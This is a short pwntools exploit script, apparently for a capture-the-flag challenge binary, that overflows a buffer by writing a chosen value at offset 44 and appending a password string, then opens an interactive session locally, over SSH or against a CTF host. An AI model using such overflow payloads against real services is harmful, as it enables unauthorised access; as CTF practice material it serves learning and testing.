#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
#context.log_level = 'debug'
context.binary = './build/name'

e = ELF('./build/name')
rop = ROP('./build/name')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('ctf.isss.io', 5678)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/name', cwd='problemDir')
else:
    p = e.process()

payload = flat({44:p32(42069)},b"super_secret_password\x00")

p.sendline(payload)
p.interactive()
